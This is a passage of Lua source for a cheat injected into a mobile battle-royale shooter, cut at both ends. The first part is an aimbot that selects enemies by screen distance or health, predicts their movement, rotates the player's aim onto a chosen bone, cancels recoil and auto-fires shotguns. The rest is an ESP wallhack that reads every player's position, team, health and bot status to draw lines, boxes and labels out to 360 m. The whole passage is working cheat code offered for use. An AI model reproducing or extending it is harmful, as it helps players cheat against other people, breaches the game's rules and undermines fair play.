    local isADS    = player.bIsGunADS

    local weapon = player.WeaponManagerComponent and player.WeaponManagerComponent.CurrentWeaponReplicated
    if not weapon and type(player.GetCurrentShootWeapon) == "function" then
        weapon = player:GetCurrentShootWeapon()
    end

    local isShotgun, isSniper = false, false
    local currentAmmo = 1
    if slua.isValid(weapon) then
        local wID   = type(weapon.GetWeaponID)   == "function" and weapon:GetWeaponID()   or 0
        local wName = type(weapon.GetWeaponName) == "function" and weapon:GetWeaponName() or ""
        if (wID >= 1030000 and wID < 1040000)
           or wName:find("S686") or wName:find("S1897") or wName:find("S12")
           or wName:find("DBS")  or wName:find("M1014") then
            isShotgun = true
        end
        if wName:find("Kar98") or wName:find("M24")   or wName:find("AWM")
           or wName:find("Mosin") or wName:find("Win94") or wName:find("AMR")
           or wName:find("SKS")   or wName:find("SLR")   or wName:find("Mini")
           or wName:find("Mk14")  or wName:find("QBU")   or wName:find("Mk12")
           or wName:find("VSS") then
            isSniper = true
        end
        if type(weapon.GetCurrentAmmo) == "function" then
            currentAmmo = weapon:GetCurrentAmmo()
        elseif weapon.ShootWeaponComponent
           and type(weapon.ShootWeaponComponent.GetCurrentAmmo) == "function" then
            currentAmmo = weapon.ShootWeaponComponent:GetCurrentAmmo()
        elseif weapon.CurrentAmmo ~= nil then
            currentAmmo = weapon.CurrentAmmo
        end
    end

    if _G.GTLMODState.IsAutoFiring then
        pcall(function()
            player.bIsWeaponFiring = false
            if type(player.SetIsWeaponFiring) == "function" then player:SetIsWeaponFiring(false) end
            if slua.isValid(pc) and type(pc.SetIsWeaponFiring) == "function" then pc:SetIsWeaponFiring(false) end
            local wepMgr = player.WeaponManagerComponent
            if slua.isValid(wepMgr) then wepMgr.bIsWeaponFiring = false end
        end)
        _G.GTLMODState.IsAutoFiring = false
    end

    if isShotgun and currentAmmo <= 0 then return end

    local cond, prioMode, boneIdx = 2, 1, 1
    local speedVal, fovVal, maxDistMeters = 50, 30, 50
    local useVisCheck, igKnock, igBot = false, false, false
    local predVal, recoilCompVal = 0, 0

    if isShotgun and CFGM.AimTouchSG then
        cond = CTD.AimTouchSGCond or 1
        if CFGM.AimTouchSGAutoFire then cond = 2 end
        if cond == 1 and not isFiring then return end
        prioMode      = CTD.AimTouchSGPrio  or 1
        boneIdx       = CTD.AimTouchSGBone  or 2
        speedVal      = CTD.AimTouchSGSpeed or 80
        fovVal        = CTD.AimTouchSGFOV   or 40
        maxDistMeters = CTD.AimTouchSGDist  or 30
        useVisCheck   = CFGM.AimTouchSGVisCheck
        igKnock       = CFGM.AimTouchSGIgKnock
        igBot         = CFGM.AimTouchSGIgBot
    elseif isADS then
        if isSniper and CFGM.AimTouchScopeSniper then
            cond = CTD.AimTouchSniperCond or 2
            if cond == 1 and not isFiring then return end
            prioMode      = CTD.AimTouchSniperPrio  or 1
            boneIdx       = CTD.AimTouchSniperBone  or 1
            speedVal      = CTD.AimTouchSniperSpeed or 30
            fovVal        = CTD.AimTouchSniperFOV   or 20
            maxDistMeters = CTD.AimTouchSniperDist  or 400
            useVisCheck   = CFGM.AimTouchSniperVisCheck
            igKnock       = CFGM.AimTouchSniperIgKnock
            igBot         = CFGM.AimTouchSniperIgBot
            predVal       = CTD.AimTouchSniperPred  or 0
        elseif CFGM.AimTouchScopeAll then
            cond = CTD.AimTouchScopeCond or 1
            if cond == 1 and not isFiring then return end
            prioMode      = CTD.AimTouchScopePrio  or 1
            boneIdx       = CTD.AimTouchScopeBone  or 2
            speedVal      = CTD.AimTouchScopeSpeed or 40
            fovVal        = CTD.AimTouchScopeFOV   or 20
            maxDistMeters = CTD.AimTouchScopeDist  or 300
            useVisCheck   = CFGM.AimTouchScopeVisCheck
            igKnock       = CFGM.AimTouchScopeIgKnock
            igBot         = CFGM.AimTouchScopeIgBot
            predVal       = CTD.AimTouchScopePred   or 0
            recoilCompVal = CTD.AimTouchScopeRecoil or 0
        else
            return
        end
    else
        if not CFGM.AimTouchHipfire then return end
        cond = CTD.AimTouchHipCond or 1
        if cond == 1 and not isFiring then return end
        prioMode      = CTD.AimTouchHipPrio  or 1
        boneIdx       = CTD.AimTouchHipBone  or 1
        speedVal      = CTD.AimTouchHipSpeed or 50
        fovVal        = CTD.AimTouchHipFOV   or 30
        maxDistMeters = CTD.AimTouchHipDist  or 250
        useVisCheck   = CFGM.AimTouchHipVisCheck
        igKnock       = CFGM.AimTouchHipIgKnock
        igBot         = CFGM.AimTouchHipIgBot
    end

    local currentMaxDist = maxDistMeters * 100
    local enemies = _G.GetEnemyTargetsFromActors(currentMaxDist)
    if not enemies or #enemies == 0 then return end

    local FVector2D         = AimState.FVector2D         or import("Vector2D");         AimState.FVector2D = FVector2D
    local UGameplayStatics  = AimState.UGameplayStatics  or import("GameplayStatics");  AimState.UGameplayStatics = UGameplayStatics
    local KismetMathLibrary = AimState.KismetMathLibrary or import("KismetMathLibrary"); AimState.KismetMathLibrary = KismetMathLibrary

    local camManager = UGameplayStatics.GetPlayerCameraManager(pc, 0)
    if not slua.isValid(camManager) then return end
    local camLoc = camManager:GetCameraLocation()
    if not camLoc then return end

    local ui_util = GetUIUtil()
    if not ui_util then return end
    local viewportSize = ui_util.GetViewportSize()
    if not viewportSize then return end

    local centerX = viewportSize.X * 0.5
    local centerY = viewportSize.Y * 0.5
    local FOV_RADIUS = (fovVal / 100.0) * (viewportSize.X / 2.0)

    local bestTarget, bestScore = nil, 99999999
    local selBoneName = "head"
    if     boneIdx == 1 then selBoneName = "head"
    elseif boneIdx == 2 then selBoneName = "spine_03"
    elseif boneIdx == 3 then selBoneName = "spine_01"
    elseif boneIdx == 4 then selBoneName = "pelvis" end

    for i, target in ipairs(enemies) do
        if not slua.isValid(target) then goto continue end

        pcall(function()
            if slua.isValid(target.Mesh) then
                target.Mesh.MeshComponentUpdateFlag = 0
            end
        end)

        if igKnock and target.HealthStatus == 1 then goto continue end
        if igBot and GetBotStatus(target, nil) then goto continue end

        if useVisCheck then
            local curTime = os.clock()
            local tId = type(target.GetUniqueID) == "function" and target:GetUniqueID() or tostring(target)
            _G.AimTouchVisCache = _G.AimTouchVisCache or {}
            if not _G.AimTouchVisCache[tId]
               or (curTime - _G.AimTouchVisCache[tId].time) > 0.2 then
                local isHidden = true
                pcall(function() if pc:LineOfSightTo(target) then isHidden = false end end)
                _G.AimTouchVisCache[tId] = { hidden = isHidden, time = curTime }
            end
            if _G.AimTouchVisCache[tId].hidden then goto continue end
        end

        local tPos = target:GetBonePos(selBoneName, {X=0, Y=0, Z=0})
        if not tPos or (tPos.X == 0 and tPos.Y == 0 and tPos.Z == 0) then
            if type(target.GetSocketLocation) == "function" then
                tPos = target:GetSocketLocation(selBoneName)
            end
        end
        if not tPos or (tPos.X == 0 and tPos.Y == 0 and tPos.Z == 0) then
            if type(target.K2_GetActorLocation) == "function" then
                tPos = target:K2_GetActorLocation()
                if tPos then
                    if     boneIdx == 1 then tPos.Z = tPos.Z + 70
                    elseif boneIdx == 2 then tPos.Z = tPos.Z + 40
                    elseif boneIdx == 3 then tPos.Z = tPos.Z + 20 end
                end
            end
        end
        if not tPos or (tPos.X == 0 and tPos.Y == 0 and tPos.Z == 0) then goto continue end

        local screen = FVector2D()
        local success = pc:ProjectWorldLocationToScreen(tPos, screen, false)
        if not success or screen.X <= 0 or screen.Y <= 0 then goto continue end

        local dx = screen.X - centerX
        local dy = screen.Y - centerY
        local distScreen = math.sqrt(dx*dx + dy*dy)
        if distScreen > FOV_RADIUS then goto continue end

        local currentScore = distScreen
        if prioMode == 2 then currentScore = player:GetDistanceTo(target)
        elseif prioMode == 3 then currentScore = target.Health or 100
        elseif prioMode == 4 then
            local hp    = target.Health    or 100
            local maxhp = target.HealthMax or 100
            if maxhp <= 0 then maxhp = 100 end
            currentScore = hp / maxhp
        end

        if currentScore < bestScore then
            bestScore  = currentScore
            bestTarget = target
        end
        ::continue::
    end

    if not slua.isValid(bestTarget) then return end

    local finalBonePos = bestTarget:GetBonePos(selBoneName, {X=0, Y=0, Z=0})
    if not finalBonePos or (finalBonePos.X == 0 and finalBonePos.Y == 0 and finalBonePos.Z == 0) then
        if type(bestTarget.GetSocketLocation) == "function" then
            finalBonePos = bestTarget:GetSocketLocation(selBoneName)
        end
    end
    if not finalBonePos or (finalBonePos.X == 0 and finalBonePos.Y == 0 and finalBonePos.Z == 0) then
        if type(bestTarget.K2_GetActorLocation) == "function" then
            finalBonePos = bestTarget:K2_GetActorLocation()
            if finalBonePos then
                if     boneIdx == 1 then finalBonePos.Z = finalBonePos.Z + 70
                elseif boneIdx == 2 then finalBonePos.Z = finalBonePos.Z + 40
                elseif boneIdx == 3 then finalBonePos.Z = finalBonePos.Z + 20 end
            end
        end
    end
    if not finalBonePos or (finalBonePos.X == 0 and finalBonePos.Y == 0 and finalBonePos.Z == 0) then return end

    if predVal > 0 then
        pcall(function()
            local tVelocity = nil
            if type(bestTarget.GetVelocity) == "function" then
                tVelocity = bestTarget:GetVelocity()
            end
            if tVelocity and (tVelocity.X ~= 0 or tVelocity.Y ~= 0) then
                local distToEnemy = player:GetDistanceTo(bestTarget) / 100.0
                local ToF = (distToEnemy / 800.0) * (predVal / 50.0)
                finalBonePos.X = finalBonePos.X + (tVelocity.X * ToF)
                finalBonePos.Y = finalBonePos.Y + (tVelocity.Y * ToF)
            end
        end)
    end

    local rot = KismetMathLibrary.FindLookAtRotation(camLoc, finalBonePos)
    if not rot then return end

    local currentRot = pc:GetControlRotation()
    if not currentRot then return end

    local deltaYaw   = rot.Yaw   - currentRot.Yaw
    local deltaPitch = rot.Pitch - currentRot.Pitch

    if isADS then
        local camRot = nil
        if type(camManager.GetCameraRotation) == "function" then
            camRot = camManager:GetCameraRotation()
        end
        if camRot then
            deltaYaw   = deltaYaw   - (camRot.Yaw   - currentRot.Yaw)
            deltaPitch = deltaPitch - (camRot.Pitch - currentRot.Pitch)
        end
    end

    if deltaYaw   >  180 then deltaYaw   = deltaYaw   - 360 end
    if deltaYaw   < -180 then deltaYaw   = deltaYaw   + 360 end
    if deltaPitch >  180 then deltaPitch = deltaPitch - 360 end
    if deltaPitch < -180 then deltaPitch = deltaPitch + 360 end

    local smoothFactor
    if speedVal >= 100 then
        smoothFactor = 1.0
    else
        smoothFactor = (speedVal / 100.0) * 0.3
        if smoothFactor < 0.01 then smoothFactor = 0.01 end
    end
    if smoothFactor < 1.0 then
        smoothFactor = 1.0 - (1.0 - smoothFactor) ^ (aimDt / 0.016)
    end

    local finalPitch = currentRot.Pitch + (deltaPitch * smoothFactor)
    local finalYaw   = currentRot.Yaw   + (deltaYaw   * smoothFactor)

    if recoilCompVal > 0 and isFiring then
        local pullDownForce = (recoilCompVal / 50.0) * 1.5
        finalPitch = finalPitch - pullDownForce
    end

    pc:SetControlRotation({ Pitch = finalPitch, Yaw = finalYaw, Roll = 0 }, "AimTouch")

    if isShotgun and CFGM.AimTouchSGAutoFire then
        pcall(function()
            local distToTarget = player:GetDistanceTo(bestTarget) / 100
            if distToTarget <= maxDistMeters then
                player.bIsWeaponFiring = true
                if type(player.SetIsWeaponFiring) == "function" then player:SetIsWeaponFiring(true) end
                if slua.isValid(pc) and type(pc.SetIsWeaponFiring) == "function" then pc:SetIsWeaponFiring(true) end
                local wepMgr = player.WeaponManagerComponent
                if slua.isValid(wepMgr) then wepMgr.bIsWeaponFiring = true end
                local curWep = player:GetCurrentWeapon()
                if slua.isValid(curWep) and type(curWep.StartFire) == "function" then
                    curWep:StartFire()
                end
                _G.GTLMODState.IsAutoFiring = true
            end
        end)
    end
end
_G.AimTouch = function() _G.GTLSafe("AimTouch", AimTouchImpl) end
end

-- ========================================== 
-- MAIN LOOP: EXTREMELY POWERFUL OPTIMIZED
-- ========================================== 
-- ==============================================================================
--  ESP V2 SYSTEM -- NEW (esp.lua @SRC_HUB / @XThrlen)
--  Line, Health Bar, Corner Box, Snap Line, Counter -- sab naya
-- ==============================================================================
_G.LoadESPV2System = function()
if _G.IsESPV2Loaded then return end
_G.IsESPV2Loaded = true

local ESP_Enabled = true

local FVector2D = _G.FVector2D or import("Vector2D")
local FLinearColor = _G.FLinearColor or import("LinearColor")
local SlateBlueprintLibrary = nil
local WidgetLayoutLibrary = nil
local SlateColor = nil
local GameplayStaticsESP = nil
pcall(function() SlateBlueprintLibrary = import("SlateBlueprintLibrary") end)
pcall(function() WidgetLayoutLibrary = import("WidgetLayoutLibrary") end)
pcall(function() SlateColor = import("SlateColor") or import("/Script/SlateCore.SlateColor") end)
pcall(function() GameplayStaticsESP = import("GameplayStatics") end)
local KismetSystemLibraryESP = nil
local HitResultClassESP = nil
pcall(function() KismetSystemLibraryESP = import("KismetSystemLibrary") end)
pcall(function() HitResultClassESP = import("HitResult") end)
local TraceStartPos = { X = 0, Y = 0, Z = 0 }
local CachedHitResult = nil
pcall(function()
  if HitResultClassESP then CachedHitResult = HitResultClassESP()
  else CachedHitResult = {} end
end)

local function ESPValid(obj)
  if obj == nil then return false end
  local isv = slua and slua.isValid
  if not isv then return false end
  local ok, v = pcall(isv, obj)         -- koi closure nahi banta (pehle har call par naya closure = garbage)
  return ok and v == true
end

local function ESPV2(x, y)
  if FVector2D then return FVector2D(x, y) end
  return { X = x, Y = y }
end

local function ESPMKC(r, g, b, a)
  if FLinearColor then return FLinearColor(r, g, b, a) end
  return { R = r, G = g, B = b, A = a }
end

local CFG = {
  MaxDistance = 36000,      -- cm (360 m) [v4.8] premium range 360m
  SnapMaxMeters = 100,      -- [v4.9] ESP line sirf 100m tak
  LabelMaxMeters = 100,     -- [v5.1] labels sirf 100m tak (same as ESP line, dur par garble fix)
  MaxTracked = 12,          -- FIX: 16 se 12 kar diya -- 20-30 players par lag reduce
  ScreenMargin = 220,
  SnapOriginY = 0.0,        -- top edge se start (original)
  SnapThickness = 1.8,
  BoxMinWidth = 22,
  BoxMaxWidth = 320,
  BoxMinHeight = 1.5,       -- [v4.8] 14->1.5: pehle 14px se chhota box (~80-100m par) hide ho jata tha, ab 360m tak dikhega
  BoxWidthFactor = 0.62,
  HeadExtra = 0.06,
  FootExtra = 0.02,
  SideBarWidth = 3.5,
  SideBarGap = 5.0,
  SideBgAlpha = 0.55,
  DeadZone = 0.5,           -- px, isse kam harkat = slate ko chhuna nahi (flicker fix)
  VisInterval = 0.15,       -- sec, LineTrace itni der me ek bar per target (lag fix)
  SizeHyst = 2.0,           -- px, viewport me itna farq ignore
}

-- esplook.png colors
local C_WHITE  = ESPMKC(1.0, 1.0, 1.0, 1.0)
local C_BLACK  = ESPMKC(0.0, 0.0, 0.0, 1.0)
local C_GREEN  = ESPMKC(0.12, 1.0, 0.25, 1.0)   -- snap line + "Open"
local C_RED    = ESPMKC(1.0, 0.15, 0.15, 1.0)   -- low health + "Close"
local C_YELLOW = ESPMKC(1.0, 0.90, 0.30, 1.0)   -- double chevron

-- Engine ke chhote wrappers. pcall(H.xxx, ...) istemal hota hai taake har frame naya closure na bane
-- (pehle har widget write par pcall(function() ... end) = naya closure = garbage = GC lag).
local H = {}
function H.vis(w, v) w:SetWidgetVisibility(v) end
function H.brush(w, c) w:SetBrushColor(c) end
function H.pos(slot, x, y) slot:SetPosition(ESPV2(x, y)) end
function H.size(slot, x, y) slot:SetSize(ESPV2(x, y)) end
function H.ang(w, a) w:SetRenderAngle(a) end
function H.proj(pc, loc, pix) return pc:ProjectWorldLocationToScreen(loc, pix, true) end
function H.loc(ch) local l = ch:K2_GetActorLocation(); return l.X, l.Y, l.Z end
function H.alive(ch) return ch:IsAlive() end
function H.capsule(ch) return ch:GetCapsuleComponent() end
function H.capLoc(cap) local l = cap:K2_GetComponentLocation(); return l.X, l.Y, l.Z end
function H.capHalf(cap) return cap:GetScaledCapsuleHalfHeight() end
function H.team(ch) return ch:GetTeamID() end
function H.pawns() return Game:GetAllPlayerPawns() end
function H.now() return GameplayStaticsESP.GetRealTimeSeconds(slua.getWorld()) end

local function RND(v)
  if v ~= v then return 0 end
  return math.floor(v + 0.5)
end

local function Lerp(a, b, t) return a + (b - a) * t end

-- Health color: 3 rang HP ke hisaab se + knocked ke liye red
-- GREEN  : 100% → 75% HP  (sRGB ~52,182,80  → linear 0.0343, 0.4678, 0.0802)
-- ORANGE : 75% → 25% HP   (sRGB ~255,140,0  → linear 1.0,   0.2848, 0.0)
-- RED    : 25% → 0% HP    (sRGB ~220,20,20  → linear 0.7051, 0.0054, 0.0054)
-- Knocked: RED (caller ESP.UpdateHealthBar pass karta hai pct = -1 knocked ke liye)
local function HealthColor(pct)
  if pct < 0 then
    -- Knocked = red
    return ESPMKC(0.7051, 0.0054, 0.0054, 1.0)
  elseif pct <= 0.25 then
    -- 0% - 25% = red
    return ESPMKC(0.7051, 0.0054, 0.0054, 1.0)
  elseif pct <= 0.75 then
    -- 25% - 75% = orange
    return ESPMKC(1.0, 0.2848, 0.0, 1.0)
  else
    -- 75% - 100% = green
    return ESPMKC(0.0343, 0.4678, 0.0802, 1.0)
  end
end

local ESP = {}
ESP.Canvas = nil
ESP.Lines = {}      -- snap lines : key -> {Widget, Slot}
ESP.HealthBg = {}   -- health bg (dark) : key -> {Widget, Slot}
ESP.HealthFill = {} -- health fill (pct + color) : key -> {Widget, Slot}
ESP.Labels = {}     -- [v4.9] naam + meter text (feet ke neeche) : key -> {Widget, Slot}
ESP.NameCache = {}  -- [v4.9] key -> player name
ESP.Ribbon = nil   -- top ribbon counter (Esp.lua se)
ESP.EnemyCache = {}
ESP.VisCache = {}   -- visibility cache: key -> {b, t}
ESP.TS = {}         -- per-target cache (alive / health / capsule): key -> table
ESP.Known = {}      -- jin keys ke paas koi widget ya cache hai
ESP.ReleaseAt = {}  -- key -> waqt jab uske widgets destroy honge (hysteresis: cache se nikalte hi destroy nahi)
ESP.ReleaseDelay = 2.5
ESP._active = {}    -- key -> generation (is Update mein draw hua)
ESP._seen = {}      -- key -> generation (is Update mein EnemyCache mein tha)
ESP.BotMem = {}     -- key -> {b = isBot, t = waqt}   (bot check bar-bar nahi)
-- ESP line ka "visible" rang: DARK PURE RED. ESPMKC = LINEAR rang leta hai (sRGB nahi):
--   linear (0.5776, 0, 0) = sRGB (200, 0, 0).  Pehle (1.0, 0.15, 0.15) tha = sRGB (255,108,108) = halka gulabi.
ESP.SNAP_RED = ESPMKC(0.5776, 0.0, 0.0, 1.0)
ESP.ScaleX = 1.0
ESP.ScaleY = 1.0
ESP.OffsetX = 0.0
ESP.OffsetY = 0.0
ESP.ViewW = 1920
ESP.ViewH = 1080
ESP.ScanInterval = 0.45        -- FIX: 0.35→0.45, zyda players ho to scan kam hoga
ESP.LightInterval = 0.033
ESP.TransformInterval = 0.60   -- FIX: 0.50→0.60, transform update throttle badha diya
ESP.LastScan = -999.0
ESP.LastTransform = -999.0
ESP.LastWorld = nil
ESP.bActive = false

function ESP.GetGameplayData()
  if ESP._GDP then return ESP._GDP end
  local ok, GDP = pcall(function() return require("GameLua.GameCore.Data.GameplayData") end)
  if ok and GDP then ESP._GDP = GDP return GDP end
  return nil
end

function H.gdpPc()
  local GDP = ESP.GetGameplayData()
  if GDP and GDP.GetPlayerController then return GDP.GetPlayerController() end
end
function H.hudPc()
  if slua_GameFrontendHUD then return slua_GameFrontendHUD:GetPlayerController() end
end

-- Controller 1 second tak cache (har Update par GameplayData se dobara poochna ek faltu engine call tha).
-- Har call par sirf isValid check hota hai; invalid ho to turant dobara dhoondhta hai.
function ESP.GetController()
  local now = ESP._now or 0
  local pc = ESP._pc
  if pc ~= nil then
    local dt = now - (ESP._pcT or -1e9)
    if dt >= 0 and dt < 1.0 and ESPValid(pc) then return pc end
  end
  pc = nil
  local ok, r = pcall(H.gdpPc)
  if ok then pc = r end
  if not ESPValid(pc) then
    ok, r = pcall(H.hudPc)
    if ok then pc = r end
  end
  if ESPValid(pc) then
    ESP._pc, ESP._pcT = pc, now
    return pc
  end
  ESP._pc = nil
  return nil
end

-- Widget zinda hai? isValid ek engine crossing hai. Widgets sirf tab marte hain jab canvas marta hai ya hum khud
-- destroy karte hain, isliye har widget ko ~0.5 s mein EK baar check karte hain (canvas badalne par _vep badalta hai
-- aur sab turant dobara check hote hain).
ESP.WCheckEvery = 0.5
ESP._vep = 0
function ESP.WOk(d)
  if not d then return false end
  local w = d.Widget
  if w == nil then return false end
  local now = ESP._now or 0
  local dt = now - (d.vt or -1e9)
  if d.ve == ESP._vep and dt >= 0 and dt < ESP.WCheckEvery then return d.vok end
  local ok = ESPValid(w)
  d.ve, d.vt, d.vok = ESP._vep, now, ok
  return ok
end

function ESP.GetLocalCharacter()
  local c = nil
  pcall(function()
    local GDP = ESP.GetGameplayData()
    if GDP then
      if GDP.GetPlayerCharacter then c = GDP.GetPlayerCharacter() end
      if not ESPValid(c) and GDP.GetLocalCharacter then c = GDP.GetLocalCharacter() end
    end
  end)
  if not ESPValid(c) then
    local pc = ESP.GetController()
    pcall(function() if pc and pc.GetPawn then c = pc:GetPawn() end end)
  end
  return ESPValid(c) and c or nil
end

function ESP.GetAllCharacters()
  local AllChars = {}
  pcall(function()
    local Pawns = Game:GetAllPlayerPawns()
    if Pawns then
      for _, Pawn in pairs(Pawns) do
        if Pawn and slua.isValid(Pawn) then
          local pKey = nil
          if Pawn.GetPlayerKey then pcall(function() pKey = Pawn:GetPlayerKey() end) end
          if not pKey and Pawn.PlayerKey then pKey = Pawn.PlayerKey end
          if not pKey and Pawn.PlayerState and Pawn.PlayerState.PlayerKey then pKey = Pawn.PlayerState.PlayerKey end
          if pKey then AllChars[pKey] = Pawn end
        end
      end
    end
  end)
  if not next(AllChars) then
    pcall(function()
      local GS = require("GameLua.GameCore.Data.CGameState")
      if GS and GS.GetAllCharacters then AllChars = GS:GetAllCharacters() end
    end)
  end
  return AllChars
end

function ESP.GetMyPlayerKey()
  local pc = ESP.GetController()
  if not ESPValid(pc) then return nil end
  local k = nil
  pcall(function()
    if pc.GetPlayerKey then k = pc:GetPlayerKey()
    elseif pc.PlayerState and pc.PlayerState.PlayerKey then k = pc.PlayerState.PlayerKey end
  end)
  return k
end

function ESP.IsMe(Character, PlayerKey, MyKey)
  local me = false
  pcall(function()
    local GDP = ESP.GetGameplayData()
    if GDP and GDP.GetLocalCharacter then
      local mc = GDP.GetLocalCharacter()
      if mc and Character == mc then me = true return end
    end
    local pc = ESP.GetController()
    if pc and pc.GetPawn then
      local p = pc:GetPawn()
      if p and Character == p then me = true return end
    end
  end)
  if not me and MyKey ~= nil and PlayerKey ~= nil then
    me = (tostring(PlayerKey) == tostring(MyKey))
  end
  return me
end

function H.team1(ch) if ch.GetTeamID then return ch:GetTeamID() end end
function H.team2(ch) return ch.TeamID end
function H.psSafe(ch)
  if ch.GetPlayerStateSafety then return ch:GetPlayerStateSafety()
  elseif ch.GetPlayerState then return ch:GetPlayerState() end
end
function H.psProp(ch) return ch.PlayerState end
function H.psTeam1(ps) if ps.GetTeamID then return ps:GetTeamID() end end
function H.psTeam2(ps) return ps.TeamID end

function ESP.GetTeamID(Character, trusted)
  if not trusted and not ESPValid(Character) then return nil end
  local ok, id = pcall(H.team1, Character)
  if not ok then id = nil end
  if id == nil then
    ok, id = pcall(H.team2, Character)
    if not ok then id = nil end
  end
  if id == nil then
    local ps = nil
    ok, ps = pcall(H.psSafe, Character)
    if not ok then ps = nil end
    if not ESPValid(ps) then
      ok, ps = pcall(H.psProp, Character)
      if not ok then ps = nil end
    end
    if ESPValid(ps) then
      ok, id = pcall(H.psTeam1, ps)
      if not ok then id = nil end
      if id == nil then
        ok, id = pcall(H.psTeam2, ps)
        if not ok then id = nil end
      end
    end
  end
  return id
end

function H.hp1(ch) return ch.Health end
function H.hp2(ch) return ch.HP end
function H.mhp1(ch) return ch.MaxHealth end
function H.mhp2(ch) return ch.MaxHP end

function ESP.IsAlive(Character)
  if not ESPValid(Character) then return false end
  local ok, alive = pcall(H.alive, Character)
  if ok and type(alive) == "boolean" then return alive end
  local hp = nil
  ok, hp = pcall(H.hp1, Character)
  if not ok then hp = nil end
  if type(hp) ~= "number" then
    ok, hp = pcall(H.hp2, Character)
    if not ok then hp = nil end
  end
  if type(hp) == "number" then return hp > 0 end
  return true
end

function ESP.IsKnocked(Character)
  if not ESPValid(Character) then return false end
  local k = false
  pcall(function()
    if Character.HealthStatus == 1 then k = true end
  end)
  if not k then pcall(function()
    if Character.IsNearDeath and Character:IsNearDeath() then k = true end
  end) end
  return k
end

function ESP.IsBot(Character)
  if not ESPValid(Character) then return false end
  local bAI = false
  pcall(function()
    if Game and Game.IsAI then bAI = Game:IsAI(Character) end
    if not bAI and Character then
      if Character.bEnsure == true or Character.bMEnsure == true then bAI = true
      elseif Character.PlayerState and Character.PlayerState.bPSEnsure == true then bAI = true
      elseif Character.Controller then
        if Character.Controller.IsMLAI == true or Character.Controller.FakePlayerBornType == 1 then bAI = true end
      end
    end
  end)
  if not bAI then
    pcall(function()
      if Character.bIsAI == true then bAI = true end
    end)
  end
  if not bAI then
    local ps = nil
    pcall(function()
      if Character.GetPlayerStateSafety then ps = Character:GetPlayerStateSafety() end
    end)
    if ESPValid(ps) then
      pcall(function()
        if ps.bIsABot == true or ps.bIsBot == true or ps.bIsAI == true then bAI = true end
      end)
    end
  end
  return bAI
end

function H.key1(ch) if ch.GetPlayerKey then return ch:GetPlayerKey() end end
function H.key2(ch) return ch.PlayerKey end
ESP.KeyStr = {}
-- PlayerKey (number) -> string; tostring ka natija cache (har scan par naya string nahi banta)
function ESP.GetPlayerKey(Character)
  local ok, key = pcall(H.key1, Character)
  if not ok then key = nil end
  if key == nil then
    ok, key = pcall(H.key2, Character)
    if not ok then key = nil end
  end
  if key == nil or key == false then return tostring(Character) end
  local tk = type(key)
  if tk == "number" or tk == "string" then
    local ks = ESP.KeyStr[key]
    if ks == nil then ks = tostring(key) ESP.KeyStr[key] = ks end
    return ks
  end
  return tostring(key)
end

function ESP.GetHealthPct(Character)
  if not ESPValid(Character) then return 1.0 end
  local ok, hp = pcall(H.hp1, Character)
  if not ok then hp = nil end
  if type(hp) ~= "number" then
    ok, hp = pcall(H.hp2, Character)
    if not ok then hp = nil end
  end
  if type(hp) ~= "number" then return 1.0 end
  local maxhp = nil
  ok, maxhp = pcall(H.mhp1, Character)
  if not ok then maxhp = nil end
  if type(maxhp) ~= "number" then
    ok, maxhp = pcall(H.mhp2, Character)
    if not ok then maxhp = nil end
  end
  if type(maxhp) ~= "number" or maxhp <= 0 then maxhp = 100 end
  local pct = hp / maxhp
  if pct ~= pct then return 1.0 end
  if pct < 0 then pct = 0 end
  if pct > 1 then pct = 1 end
  return pct
end

local function NormalizeName(v)
  if v == nil or v == false then return nil end
  local ok, t = pcall(tostring, v)
  if not ok or not t then return nil end
  t = t:gsub("^%s+", ""):gsub("%s+$", "")
  if t == "" or t == "nil" or t == "None" or t == "NULL" or t == "Unknown" then return nil end
  return t
end

-- Bone ki position (x, y, z numbers). Fallback chain purane GetBonePos jaisi hi hai (BonePos -> Socket -> Mesh socket),
-- bas har field sirf EK baar padhi jati hai (pehle ek bone ke liye ~9 baar).
ESP._boneOut = { X = 0, Y = 0, Z = 0 }
function H.boneXYZ(Character, boneName, out)
  local x, y, z = nil, nil, nil
  if type(Character.GetBonePos) == "function" then
    local pos = Character:GetBonePos(boneName, out)
    if pos then x, y, z = pos.X, pos.Y, pos.Z end
  end
  if x == nil or (x == 0 and y == 0 and z == 0) then
    if type(Character.GetSocketLocation) == "function" then
      local pos = Character:GetSocketLocation(boneName)
      if pos then x, y, z = pos.X, pos.Y, pos.Z else x, y, z = nil, nil, nil end
    end
  end
  if (x == nil or (x == 0 and y == 0 and z == 0)) and ESPValid(Character.Mesh) then
    local mesh = Character.Mesh
    if mesh and mesh.GetSocketLocation then
      local mp = mesh:GetSocketLocation(boneName)
      if mp then
        local mx, my, mz = mp.X, mp.Y, mp.Z
        if not (mx == 0 and my == 0 and mz == 0) then x, y, z = mx, my, mz end
      end
    end
  end
  return x, y, z
end

function ESP.GetBoneXYZ(Character, boneName)
  if not Character or not boneName then return nil end
  local out = ESP._boneOut
  out.X, out.Y, out.Z = 0, 0, 0
  local ok, x, y, z = pcall(H.boneXYZ, Character, boneName, out)
  if ok and x ~= nil then return x, y, z end
  return nil
end

function H.camMgr(pc)
  return GameplayStaticsESP.GetPlayerCameraManager(pc, 0)
end
function H.camLoc(mgr)
  if mgr.GetCameraLocation then
    local l = mgr:GetCameraLocation()
    return l.X, l.Y, l.Z
  end
end
function H.pawnLoc(pc)
  local p = pc:GetPawn()
  if ESPValid(p) and p.K2_GetActorLocation then
    local l = p:K2_GetActorLocation()
    return l.X, l.Y, l.Z
  end
end

-- Camera manager object cache (controller ke saath rehta hai); har baar GetPlayerCameraManager ki zaroorat nahi.
function ESP.GetCamMgr(pc)
  local mgr = ESP._cm
  if mgr ~= nil and ESP._cmPc == pc and ESPValid(mgr) then return mgr end
  mgr = nil
  if GameplayStaticsESP and GameplayStaticsESP.GetPlayerCameraManager then
    local ok, r = pcall(H.camMgr, pc)
    if ok and ESPValid(r) then mgr = r end
  end
  ESP._cm, ESP._cmPc = mgr, pc
  return mgr
end

-- Camera location (x, y, z numbers). Sirf tab maangi jati hai jab visibility check sach mein hona ho,
-- aur ek hi frame (now) mein ek hi baar fetch hoti hai.
function ESP.CamXYZ(pc, now)
  if ESP._camT == now and ESP._camX ~= nil then return ESP._camX, ESP._camY, ESP._camZ end
  local x, y, z = nil, nil, nil
  local mgr = ESP.GetCamMgr(pc)
  if mgr then
    local ok, a, b, c = pcall(H.camLoc, mgr)
    if ok and a ~= nil then x, y, z = a, b, c end
  end
  if x == nil then
    local ok, a, b, c = pcall(H.pawnLoc, pc)
    if ok and a ~= nil then x, y, z = a, b, c end
  end
